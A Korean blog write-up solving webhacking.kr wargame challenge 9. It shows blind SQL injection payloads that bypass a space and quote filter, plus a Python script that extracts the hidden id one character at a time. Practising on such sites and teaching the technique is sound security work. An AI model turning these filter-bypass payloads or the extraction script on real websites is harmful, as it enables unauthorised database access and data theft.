---
title: "webhacking.kr 9번 문제 풀이"
excerpt_separator: "<!--more-->"
categories:
  - webhacking
tags:
  - webhacking
  - wargame
classes: wide
---

[9번 바로가기](http://webhacking.kr/challenge/web/web-09/index.php)

문제 페이지에 들어가면 아래와 같은 화면이 나온다. password를 알맞게 입력하면 문제가 풀리는 방식인듯 하다.

![9번](/img/9번_1.JPG)

입력창 위에 숫자를 누르면 다른 화면이 보인다. URL을 잘 보면 no라는 인자에 클릭한 숫자가 들어가 있다.
`no=1`일 때는 "Apple", `no=2`일 때는 "Banana"가 출력되고, `no=3`일 때는 hint가 나온다.

![9번](/img/9번_3.JPG)

길이가 11이고, DB의 컬럼은 no, id가 있다고 알려주고 있다. no에 들어가는 값을 조작해서 id에 있는 값을
알아내면 되는것 같다.


`no=True`를 url에 입력하니, "Apple"이 나온다. `'`나, ` `, `union` 등 쿼리에 사용되는 일부 문자열을 입력하면 "Access Denied"라고 나온다.
no가 number형 필드이기 때문에 `if`문을 이용해 조건에 따라 `no`에 들어가는 값을 다르게 지정하여 Blind SQLi를 할 수 있다.


 `if(True,1,2)`를 넣으면 "Apple"이 나오고, `if(False,1,2)`를 넣으면 "Banana"가 나온다. `if`문 필터링되지 않고 정상적으로 사용할 수 있다.


일단 길이가 11이라고 했으니 id의 길이가 11인지 보자. 공백문자 ` `가 필터링되니까, `%09`, `%0a`, `%0d`, `/**/` 등을 사용하면 된다. 각각 탭, 라인피드, 캐리지리턴, 주석을 의미한다.
주석의 경우 `SELECT/**/col` 이렇게 쓰면 `SELECT col`와 동일하게 인식된다. `()`를 사용해서 `SELECT(col)from(talbe)` 이런식으로 해도 된다.


`if`문은 `if(조건, 참일 경우의 값, 거짓일 경우의 값)`으로 사용되는데 프로그래밍언어의 3항 연산자랑 비슷하다.
`if((length(id))in(11),1,2)` 이렇게 입력해보자, 테이블명은 여기서 지정하지 않아도 된다.
내부에서 쿼리가 `select * from table where no = if()` 이런식으로 들어가기 때문에 `select`문과 같은 테이블이면 지정할 필요가 없다.
결과는 `no=2`이 되어 "Banana"가 나온다. 길이가 11이 아니라고 나온다... 우선 `id`에 어떤 값이 있는지 찾아 보자.

![9번](/img/9번_2.JPG)


`if(strcmp(substr(id,1,1),0x41),0,3)` 이렇게 입력하면 id에 있는 첫 번째 문자가 0x41(A)인지 확인할 수 있다.
`substr()`의 1번 인자는 문자열, 2번 인자는 시작위치(1부터 시작), 3번 인자는 시작위치부터 읽을 길이이다.
`if`문이 참이라면 `no=3`이되어 "Secret\nhint:..."가 나올 것이다.
`strcmp()`는 문자열이 서로 같으면 0이 리턴되기 때문에 `if`문에 값을 반대로 적어야 한다. `strcmp()`말고 `if(substr(id,1,1)in(0x41),0,3)`이런식으로 `in()`을 사용할 수 도 있다.
혹은 `if(substr(id,1,1)like(0))` 이런식으로 `like()`함수를 이용할 수 있다. 이때는 `like()`함수에 이용되는 `%`와 같은 문자는 사용하면 안된다.


결과적으로 아래의 코드를 실행하면 Flag를 얻을 수 있다. `if((length(id))in(11),1,2)`을 통해 확인했을 때는 id의 길이가 11이 아니라고 나오지만
코드로 확인해보면 `if(strcmp(substr(id,12,1),0x41),0,3)` 처럼 id의 12번째 이상의 값은 아스키 문자 중 매칭되는 것이 없었다.


```python
import urllib.request
import re

header = {'Cookie':'PHPSESSID=본인 세션쿠키'}
code = [x for x in range(39, 127)]

for i in range(1, 12):
    for c in code:
        req = urllib.request.Request("http://webhacking.kr/challenge/web/web-09/index.php?no=if(strcmp(substr(id," + str(i) + ",1)," + hex(c) + "),0,3)", headers=header)
        data = urllib.request.urlopen(req).read()
        data = data.decode('UTF-8')
        find = re.findall('Secret', data)
        if find:
            print(str(i) + ' ' + chr(c))
            break
```
